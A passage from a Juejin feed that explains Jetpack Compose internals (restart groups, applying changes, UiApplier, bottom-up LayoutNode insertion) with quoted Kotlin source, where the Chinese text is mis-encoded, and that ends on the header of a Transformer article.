        setObjects(
            InsertSlotsWithFixups.Anchor,
            anchor,
            InsertSlotsWithFixups.FromSlotTable,
            from,
            InsertSlotsWithFixups.Fixups,
            fixups,
        )
    }
}
</code></pre>
<h3 data-id="heading-30">endRestartGroup</h3>
<p>èŠ‚ç‚¹éƒ½åˆ›å»ºå®Œæˆåï¼Œæ‰§è¡ŒendRestartGroupã€‚åœ¨æ‰§è¡ŒstartRestartGroupçš„æ—¶å€™ï¼Œåˆ›å»ºäº†é‡ç»„ä½œç”¨åŸŸå¯¹è±¡ï¼Œå°†å¯¹è±¡æ”¾åˆ°äº†å¤±æ•ˆæ ˆä¸­ã€‚æ‰§è¡ŒendRestartGroupï¼Œä»å¤±æ•ˆæ ˆä¸­å–å‡ºé‡ç»„ä½œç”¨åŸŸå¯¹è±¡ï¼Œè¿”å›å‡ºå»ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">endRestartGroup</span><span class="hljs-params">()</span></span>: ScopeUpdateScope? {
    <span class="hljs-comment">// ä»å¤±æ•ˆæ ˆä¸­å–å‡ºé‡ç»„ä½œç”¨åŸŸå¯¹è±¡</span>
    <span class="hljs-keyword">val</span> scope = <span class="hljs-keyword">if</span> (invalidateStack.isNotEmpty()) invalidateStack.pop() <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
    <span class="hljs-keyword">if</span> (scope != <span class="hljs-literal">null</span>) {
        scope.requiresRecompose = <span class="hljs-literal">false</span>
        exitRecomposeScope(scope)?.let { changeListWriter.endCompositionScope(it, composition) }
        <span class="hljs-keyword">if</span> (scope.resuming) {
            scope.resuming = <span class="hljs-literal">false</span>
            changeListWriter.endResumingScope(scope)
            scope.reusing = <span class="hljs-literal">false</span>
            <span class="hljs-keyword">if</span> (scope.resetReusing) {
                scope.resetReusing = <span class="hljs-literal">false</span>
                reusing = <span class="hljs-literal">false</span>
            }
        }
    }
    <span class="hljs-keyword">val</span> result =
        <span class="hljs-keyword">if</span> (scope != <span class="hljs-literal">null</span> &amp;&amp; !scope.skipped &amp;&amp; (scope.used || forceRecomposeScopes)) {
            <span class="hljs-keyword">if</span> (scope.anchor == <span class="hljs-literal">null</span>) {
                scope.anchor =
                    <span class="hljs-keyword">if</span> (inserting) {
                        writer.anchor(writer.parent)
                    } <span class="hljs-keyword">else</span> {
                        reader.anchor(reader.parent)
                    }
            }
            scope.defaultsInvalid = <span class="hljs-literal">false</span>
            scope
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">null</span>
        }
    end(isNode = <span class="hljs-literal">false</span>)
    <span class="hljs-comment">// è¿”å›é‡ç»„ä½œç”¨åŸŸå¯¹è±¡</span>
    <span class="hljs-keyword">return</span> result
}
</code></pre>
<p>æ‹¿åˆ°é‡ç»„ä½œç”¨åŸŸå¯¹è±¡åï¼Œè°ƒç”¨updateScopeä¿å­˜éœ€è¦é‡æ–°æ‰§è¡Œçš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯Countå‡½æ•°ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">ScopeUpdateScope var21 = $composer.endRestartGroup(); 
<span class="hljs-keyword">if</span> (var21 != <span class="hljs-literal">null</span>) { <span class="hljs-comment">// æ³¨å†Œé‡ç»„å›è°ƒï¼šå½“éœ€è¦é‡ç»„æ—¶ï¼Œè°ƒç”¨ Count$lambda$5          </span>
	var21.updateScope(DemoKt::Count$lambda$<span class="hljs-number">5</span>); 
}

<span class="hljs-comment">// é‡ç»„æ—¶è°ƒç”¨çš„lambda</span>
<span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> <span class="hljs-built_in">Unit</span> Count$lambda$<span class="hljs-number">5</span>(int $$changed, Composer $composer, int $force) {
    Count($composer, RecomposeScopeImplKt.updateChangedFlags($$changed | <span class="hljs-number">1</span>));
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Unit</span>.INSTANCE;
}
</code></pre>
<p>updateScopeæ–¹æ³•ä»…ä»…æ˜¯ä¸ºblockå¯¹è±¡èµ‹å€¼ï¼Œ</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateScope</span><span class="hljs-params">(block: (<span class="hljs-type">Composer</span>, <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    <span class="hljs-keyword">this</span>.block = block
}
</code></pre>
<p>é‡ç»„çš„æ—¶å€™ä¼šè°ƒç”¨composeæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨blockï¼ŒCountå‡½æ•°å°±ä¼šé‡æ–°æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compose</span><span class="hljs-params">(composer: <span class="hljs-type">Composer</span>)</span></span> {
    block?.invoke(composer, <span class="hljs-number">1</span>) ?: error(<span class="hljs-string">"Invalid restart scope"</span>)
}
</code></pre>
<h3 data-id="heading-31">åº”ç”¨å˜æ›´</h3>
<p><code>Button</code>ã€<code>Text</code>ç­‰èŠ‚ç‚¹éƒ½ä¿å­˜åˆ°äº†<code>Operations</code>çš„é›†åˆé‡Œé¢ï¼Œä»€ä¹ˆæ—¶å€™å–å‡ºæ¥å‘¢ï¼Ÿè®©æˆ‘ä»¬å›åˆ°<code>Recomposer.composeInitial</code>æ–¹æ³•ã€‚å½“<code>Count</code>å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œä¼šè°ƒç”¨<code>composition.applyChanges</code>åº”ç”¨å˜æ›´ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">composeInitial</span><span class="hljs-params">(
    composition: <span class="hljs-type">ControlledComposition</span>,
    content: @<span class="hljs-type">Composable</span> () -&gt; <span class="hljs-type">Unit</span>,
)</span></span> {
    <span class="hljs-keyword">try</span> {
        composing(composition, <span class="hljs-literal">null</span>) { composition.composeContent(content) }
    } <span class="hljs-keyword">catch</span> (e: Throwable) {
        <span class="hljs-keyword">if</span> (newComposition) {
            synchronized(stateLock) { unregisterCompositionLocked(composition) }
        }

        processCompositionError(e, composition, recoverable = <span class="hljs-literal">true</span>)
        <span class="hljs-keyword">return</span>
    }

    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ...</span>

    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åº”ç”¨å˜æ›´</span>
        composition.applyChanges()
        composition.applyLateChanges()
    } <span class="hljs-keyword">catch</span> (e: Throwable) {
        processCompositionError(e)
        <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">if</span> (!composerWasComposing) {
        <span class="hljs-comment">// Ensure that any state objects created during applyChanges are seen as changed</span>
        <span class="hljs-comment">// if modified after this call.</span>
        Snapshot.notifyObjectsInitialized()
    }
}
</code></pre>
<p><code>composition.applyChanges</code>ä¼šè°ƒç”¨åˆ°<code>InsertNodeFixups</code>çš„<code>execute</code>ã€‚åœ¨<code>execute</code>æ–¹æ³•ä¸­åˆ›å»ºLayoutNodeå¯¹è±¡ï¼Œå°†LayoutNodeå¯¹è±¡ä¿å­˜åˆ°slotsæ•°ç»„ä¸­ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> OperationArgContainer.<span class="hljs-title">execute</span><span class="hljs-params">(
    applier: <span class="hljs-type">Applier</span>&lt;*&gt;,
    slots: <span class="hljs-type">SlotWriter</span>,
    rememberManager: <span class="hljs-type">RememberManager</span>,
    errorContext: <span class="hljs-type">OperationErrorContext</span>?,
)</span></span> {
    <span class="hljs-comment">// å–å‡ºLayoutNodeçš„æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”æ‰§è¡Œï¼Œåˆ›å»ºLayoutNodeå¯¹è±¡</span>
    <span class="hljs-keyword">val</span> node = getObject(Factory).invoke()
    <span class="hljs-keyword">val</span> groupAnchor = getObject(GroupAnchor)
    <span class="hljs-keyword">val</span> insertIndex = getInt(InsertIndex)

    <span class="hljs-keyword">val</span> nodeApplier = <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span> (applier <span class="hljs-keyword">as</span> Applier&lt;Any?&gt;)
    <span class="hljs-comment">// ä¿å­˜åˆ°slotsæ•°ç»„ä¸­</span>
    slots.updateNode(groupAnchor, node)
    nodeApplier.insertTopDown(insertIndex, node)
    nodeApplier.down(node)
}
</code></pre>
<p>åˆ°æ­¤ï¼Œ<code>Button</code>ã€<code>Text</code>ç»„ä»¶ä¹Ÿè¢«æ”¾åˆ°slotsæ•°ç»„é‡Œé¢äº†ï¼Œæ‰€æœ‰çš„ç»„ä»¶æœ€ç»ˆéƒ½æ˜¯LayoutNodeå¯¹è±¡ã€‚æ­¤æ—¶ï¼Œæ•°ç»„å°±å˜æˆäº†è¿™æ ·ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Group 0: Root Group (<span class="hljs-attr">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ Group 1: KeyHash Group (<span class="hljs-attr">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots<span class="hljs-section">[0]</span>: content lambda (setContent ä¼ å…¥çš„ lambda)
â””â”€â”€ Group 2: Invocation Group (<span class="hljs-attr">key</span> = invocationKey)
â””â”€â”€ Group 3: <span class="hljs-attr">key</span> = -<span class="hljs-number">1491082337</span>
â””â”€â”€ slots<span class="hljs-section">[1]</span>: RecomposeScopeImpl // é‡ç»„ä½œç”¨åŸŸå¯¹è±¡
â””â”€â”€ slots<span class="hljs-section">[2]</span>: MutableState&lt;Int&gt;(<span class="hljs-attr">value</span>=<span class="hljs-number">0</span>)  // remember çš„å€¼
â””â”€â”€ Group 4: <span class="hljs-attr">key</span> = -<span class="hljs-number">548075111</span>
â””â”€â”€ slots<span class="hljs-section">[3]</span>: content$delegate (MutableState å¼•ç”¨ï¼Œç”¨äº changed æ£€æµ‹)
â””â”€â”€ slots<span class="hljs-section">[4]</span>: Function0 (onClick lambda)
â””â”€â”€ Group 5: <span class="hljs-attr">key</span> = <span class="hljs-number">125</span>ï¼Œgroupinfoé‡Œé¢è®°å½•çš„isNodeä¸º<span class="hljs-literal">true</span>
â””â”€â”€ slots<span class="hljs-section">[5]</span>: Buttonç»„ä»¶
â””â”€â”€ slots<span class="hljs-section">[6]</span>: Textç»„ä»¶
</code></pre>
<h3 data-id="heading-32">SlotTableæ˜ å°„åˆ°LayoutNode</h3>
<p>LayoutNodeæ ‘æ˜¯å®é™…çš„èŠ‚ç‚¹æ ‘ï¼Œç”¨äºæµ‹é‡ã€å¸ƒå±€å’Œç»˜åˆ¶ã€‚SlotTableç»“æ„çš„å˜åŒ–æœ€ç»ˆè¦æ˜ å°„åˆ°LayoutNodeï¼Œé€šè¿‡Applieræ¥å£æ¥è°ƒç”¨åˆ°LayoutNodeã€‚Applieræä¾›äº†ä»ä¸Šåˆ°ä¸‹ã€ä»ä¸‹åˆ°ä¸Šä¸¤ç§æ’å…¥æ–¹å¼ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Applier</span>&lt;<span class="hljs-type">N</span>&gt; {
    <span class="hljs-keyword">val</span> current: N  <span class="hljs-comment">// å½“å‰æ“ä½œçš„èŠ‚ç‚¹</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">down</span><span class="hljs-params">(node: <span class="hljs-type">N</span>)</span></span>  <span class="hljs-comment">// è¿›å…¥å­èŠ‚ç‚¹</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">up</span><span class="hljs-params">()</span></span>           <span class="hljs-comment">// è¿”å›çˆ¶èŠ‚ç‚¹</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertTopDown</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, instance: <span class="hljs-type">N</span>)</span></span>   <span class="hljs-comment">// è‡ªé¡¶å‘ä¸‹æ’å…¥</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertBottomUp</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, instance: <span class="hljs-type">N</span>)</span></span>  <span class="hljs-comment">// è‡ªåº•å‘ä¸Šæ’å…¥</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, count: <span class="hljs-type">Int</span>)</span></span>           <span class="hljs-comment">// ç§»é™¤èŠ‚ç‚¹</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(from: <span class="hljs-type">Int</span>, to: <span class="hljs-type">Int</span>, count: <span class="hljs-type">Int</span>)</span></span>     <span class="hljs-comment">// ç§»åŠ¨èŠ‚ç‚¹</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(block: <span class="hljs-type">N</span>.(<span class="hljs-type">Any</span>?) -&gt; <span class="hljs-type">Unit</span>, value: <span class="hljs-type">Any</span>?)</span></span>  <span class="hljs-comment">// åº”ç”¨å±æ€§æ›´æ–°</span>
}

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UiApplier</span>(root: LayoutNode) : AbstractApplier&lt;LayoutNode&gt;(root) {

    <span class="hljs-comment">/**
     * ä»ä¸Šåˆ°ä¸‹æ’å…¥ï¼Œæ–¹æ³•ç©ºå®ç°ï¼Œä¸ä½¿ç”¨ä»ä¸Šåˆ°ä¸‹æ’å…¥çš„æ–¹å¼
     */</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertTopDown</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, instance: <span class="hljs-type">LayoutNode</span>)</span></span> {
        <span class="hljs-comment">// Ignored. </span>
    }

    <span class="hljs-comment">/**
     * ä»ä¸‹åˆ°ä¸Šæ’å…¥ã€‚
     */</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertBottomUp</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, instance: <span class="hljs-type">LayoutNode</span>)</span></span> {
        <span class="hljs-comment">// currentå°±æ˜¯LayoutNodeå¯¹è±¡</span>
        current.insertAt(index, instance)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(index: <span class="hljs-type">Int</span>, count: <span class="hljs-type">Int</span>)</span></span> {
        current.removeAt(index, count)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(from: <span class="hljs-type">Int</span>, to: <span class="hljs-type">Int</span>, count: <span class="hljs-type">Int</span>)</span></span> {
        current.move(from, to, count)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onClear</span><span class="hljs-params">()</span></span> {
        root.removeAll()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onEndChanges</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onEndChanges()
        root.owner?.onEndApplyChanges()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">reuse</span><span class="hljs-params">()</span></span> {
        current.onReuse()
    }
}
</code></pre>
<h3 data-id="heading-33">ä¸ºä»€ä¹ˆä½¿ç”¨ä»ä¸‹åˆ°ä¸Šæ’å…¥ï¼Ÿ</h3>
<pre><code class="hljs language-less" lang="less">ä»ä¸Šåˆ°ä¸‹æ’å…¥:                          ä»ä¸‹åˆ°ä¸Šæ’å…¥:
    <span class="hljs-number">1</span>           <span class="hljs-number">2</span>           <span class="hljs-number">3</span>           <span class="hljs-number">1</span>           <span class="hljs-number">2</span>            <span class="hljs-number">3</span>
    <span class="hljs-selector-tag">R</span>           <span class="hljs-selector-tag">R</span>           <span class="hljs-selector-tag">R</span>           <span class="hljs-selector-tag">B</span>           <span class="hljs-selector-tag">B</span>            <span class="hljs-selector-tag">R</span>
    |           |           |           |          / \           |
    <span class="hljs-selector-tag">B</span>           <span class="hljs-selector-tag">B</span>           <span class="hljs-selector-tag">B</span>           <span class="hljs-selector-tag">A</span>         <span class="hljs-selector-tag">A</span>   <span class="hljs-selector-tag">C</span>          <span class="hljs-selector-tag">B</span>
               /           / \                                  / \
              <span class="hljs-selector-tag">A</span>           <span class="hljs-selector-tag">A</span>   <span class="hljs-selector-tag">C</span>                                <span class="hljs-selector-tag">A</span>   <span class="hljs-selector-tag">C</span>
</code></pre>
<p>å¯¹äº LayoutNode æ ‘ï¼Œå½“å­èŠ‚ç‚¹æ’å…¥æ—¶ä¼šé€šçŸ¥æ‰€æœ‰ç¥–å…ˆèŠ‚ç‚¹ï¼Œå¦‚æœä½¿ç”¨ä»ä¸Šåˆ°ä¸‹æ’å…¥ï¼š</p>
<ul>
<li>R è¢«é€šçŸ¥ B è¿›å…¥</li>
<li>B è¢«é€šçŸ¥ A è¿›å…¥ï¼ŒR è¢«é€šçŸ¥ A è¿›å…¥</li>
<li>B è¢«é€šçŸ¥ C è¿›å…¥ï¼ŒR è¢«é€šçŸ¥ C è¿›å…¥</li>
<li>å…± 5 æ¬¡é€šçŸ¥ï¼Œå‘ˆæŒ‡æ•°å¢é•¿</li>
</ul>
<p>ä½¿ç”¨ä»ä¸‹åˆ°ä¸Šæ’å…¥ï¼š</p>
<ul>
<li>B è¢«é€šçŸ¥ A è¿›å…¥</li>
<li>B è¢«é€šçŸ¥ C è¿›å…¥</li>
<li>R è¢«é€šçŸ¥ B è¿›å…¥</li>
<li>å…± 3 æ¬¡é€šçŸ¥ï¼Œçº¿æ€§å¢é•¿</li>
</ul>
<p><strong>å› ä¸ºå­èŠ‚ç‚¹çš„å˜åŠ¨ä¼šå½±å“çˆ¶èŠ‚ç‚¹çš„é‡æ–°æµ‹é‡ï¼Œä»ä¸‹åˆ°ä¸Šæ’å…¥å¯ä»¥é¿å…å½±å“å¤ªå¤šçš„çˆ¶èŠ‚ç‚¹ï¼Œæé«˜æ€§èƒ½ã€‚</strong></p>
<p><strong>ä¸ºä»€ä¹ˆè¦é€šè¿‡Applieræ¥å£è°ƒç”¨åˆ°LayoutNodeï¼Ÿè¿™é‡Œå¼€äº†ä¸ªå£å­ï¼ŒUiApplierä¸LayoutNodeåªæ˜¯å®‰å“å¹³å°çš„å¯¹åº”å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰Applierå¯ä»¥æ‰“é€ è‡ªå·±çš„æ¸²æŸ“å¼•æ“ã€‚</strong></p>
<h3 data-id="heading-34">insertBottomUp</h3>
<p><code>insertBottomUp</code>æ˜¯ä»ä¸‹å¾€ä¸Šæ’å…¥ï¼Œä»€ä¹ˆæ—¶å€™è°ƒç”¨<code>insertBottomUp</code>ï¼Ÿæ‰§è¡Œå®Œ<code>InsertNodeFixups</code>çš„<code>execute</code>åï¼Œè¿˜ä¼šæ‰§è¡Œ<code>PostInsertNodeFixups</code>çš„<code>execute</code>ï¼Œä»<code>slots</code>æ•°ç»„ä¸­å–å‡ºèŠ‚ç‚¹ï¼ŒæŠŠèŠ‚ç‚¹æ’å…¥åˆ°<code>LayoutNode</code>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> OperationArgContainer.<span class="hljs-title">execute</span><span class="hljs-params">(
    applier: <span class="hljs-type">Applier</span>&lt;*&gt;,
    slots: <span class="hljs-type">SlotWriter</span>,
    rememberManager: <span class="hljs-type">RememberManager</span>,
    errorContext: <span class="hljs-type">OperationErrorContext</span>?,
)</span></span> {
    <span class="hljs-keyword">val</span> groupAnchor = getObject(GroupAnchor)
    <span class="hljs-keyword">val</span> insertIndex = getInt(InsertIndex)

    applier.up()
    <span class="hljs-keyword">val</span> nodeApplier = <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span> (applier <span class="hljs-keyword">as</span> Applier&lt;Any?&gt;)
    <span class="hljs-comment">// ä»slotsæ•°ç»„ä¸­å–å‡ºLayoutNodeå¯¹è±¡</span>
    <span class="hljs-keyword">val</span> nodeToInsert = slots.node(groupAnchor)
    <span class="hljs-comment">// æŠŠèŠ‚ç‚¹æ’å…¥åˆ°LayoutNode</span>
    nodeApplier.insertBottomUp(insertIndex, nodeToInsert)
}
</code></pre>
<h3 data-id="heading-35">åˆ›å»ºApplierå¯¹è±¡</h3>
<p>ä»€ä¹ˆæ—¶å€™åˆ›å»ºApplierå¯¹è±¡ï¼Ÿå›åˆ°<code>doSetContent</code>æ–¹æ³•ï¼Œåˆ›å»º<code>Composition</code>å¯¹è±¡çš„æ—¶å€™åˆ›å»ºäº†<code>UiApplier</code>å¯¹è±¡ï¼ŒåŒæ—¶æŠŠ<code>AndroidComposeView</code>çš„<code>LayoutNode</code>å¯¹è±¡ä¼ é€’ç»™äº†<code>UiApplier</code>å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doSetContent</span><span class="hljs-params">(
    owner: <span class="hljs-type">AndroidComposeView</span>,
    parent: <span class="hljs-type">CompositionContext</span>,
    content: @<span class="hljs-type">Composable</span> () -&gt; <span class="hljs-type">Unit</span>,
)</span></span>: Composition {
    <span class="hljs-keyword">if</span> (isDebugInspectorInfoEnabled &amp;&amp; owner.getTag(R.id.inspection_slot_table_set) == <span class="hljs-literal">null</span>) {
        owner.setTag(
            R.id.inspection_slot_table_set,
            Collections.newSetFromMap(WeakHashMap&lt;CompositionData, <span class="hljs-built_in">Boolean</span>&gt;()),
        )
    }

    <span class="hljs-comment">// ä»æ ‡ç­¾ä¸­å–å‡ºWrappedCompositionå¯¹è±¡ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ›å»ºWrappedCompositionå¯¹è±¡ï¼Œåˆ›å»ºCompositionå¯¹è±¡ï¼Œè¿›è€Œåˆ›å»ºUiApplierå¯¹è±¡</span>
    <span class="hljs-keyword">val</span> wrapped =
        owner.view.getTag(R.id.wrapped_composition_tag) <span class="hljs-keyword">as</span>? WrappedComposition
            ?: WrappedComposition(owner, Composition(UiApplier(owner.root), parent)).also {
                owner.view.setTag(R.id.wrapped_composition_tag, it)
            }
    wrapped.setContent(content)

    <span class="hljs-keyword">return</span> wrapped
}
</code></pre>
<h2 data-id="heading-36">äº”ã€æ€»ç»“</h2>
<ul>
<li><strong>ä¼ ç»Ÿå‡½æ•°æ²¡æœ‰â€œè®°å¿†â€ï¼ŒComposeä½¿ç”¨SlotTableæ¥è®°ä½çŠ¶æ€å’ŒUIç»“æ„ã€‚</strong></li>
<li><strong>SlotTableçš„groupsæ•°ç»„ç”¨æ¥å­˜å‚¨æ‰€æœ‰ç»„çš„å…ƒæ•°æ®ï¼Œæ˜¯ä¸€ä¸ªæ‰å¹³åŒ–çš„æ ‘ç»“æ„ï¼Œç¼–è¾‘groupsæ•°ç»„ä½¿ç”¨äº†GapBufferã€‚slotsæ•°ç»„ç”¨æ¥å­˜å‚¨å®é™…æ•°æ®ï¼ˆStateã€LayoutNodeã€RecomposeScopeã€CompositionLocalã€rememberç­‰ï¼‰ã€‚</strong></li>
<li><strong>Composeå‡½æ•°åœ¨ç¼–è¯‘æœŸä¼šè¢«æ’å…¥startXXXGroup/endXXXGroupæ¨¡æ¿ä»£ç ï¼ŒstartXXXGroupä¼šæ’å…¥Groupå¹¶é€šè¿‡$keyè¯†åˆ«Groupåœ¨ä»£ç ä¸­çš„ä½ç½®ã€‚</strong></li>
<li><strong>LayoutNodeæ ‘æ˜¯å®é™…çš„èŠ‚ç‚¹æ ‘ï¼Œç”¨äºæµ‹é‡ã€å¸ƒå±€å’Œç»˜åˆ¶ã€‚SlotTableç»“æ„çš„å˜åŒ–æœ€ç»ˆè¦æ˜ å°„åˆ°LayoutNodeï¼Œé€šè¿‡Applieræ¥å£æ¥è°ƒç”¨åˆ°LayoutNodeã€‚Applieræä¾›äº†ä»ä¸Šåˆ°ä¸‹ã€ä»ä¸‹åˆ°ä¸Šä¸¤ç§æ’å…¥æ–¹å¼ï¼Œå®‰å“ä½¿ç”¨ä»ä¸‹åˆ°ä¸Šçš„æ’å…¥æ–¹å¼ï¼Œå› ä¸ºå­èŠ‚ç‚¹çš„å˜åŠ¨ä¼šå½±å“çˆ¶èŠ‚ç‚¹çš„é‡æ–°æµ‹é‡ï¼Œä»ä¸‹åˆ°ä¸Šæ’å…¥å¯ä»¥é¿å…å½±å“å¤ªå¤šçš„çˆ¶èŠ‚ç‚¹ï¼Œæé«˜æ€§èƒ½ã€‚</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Transformer æ³¨æ„åŠ›æœºåˆ¶ä¸åºåˆ—å»ºæ¨¡åŸºç¡€]]></title>    <link>https://juejin.cn/post/7595043440519806982</link>    <guid>https://juejin.cn/post/7595043440519806982</guid>    <pubDate>2026-01-14T11:41:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440519806982" data-draft-id="7595043440519790598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Transformer æ³¨æ„åŠ›æœºåˆ¶ä¸åºåˆ—å»ºæ¨¡åŸºç¡€"/> <meta itemprop="keywords" content="ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-14T11:41:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="seeksky"/> <meta itemprop="url" content="https://juejin.cn/user/306077226249100"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Transformer æ³¨æ„åŠ›æœºåˆ¶ä¸åºåˆ—å»ºæ¨¡åŸºç¡€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/306077226249100/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    seeksky
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:41:04.000Z" title="Wed Jan 14 2026 11:41:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
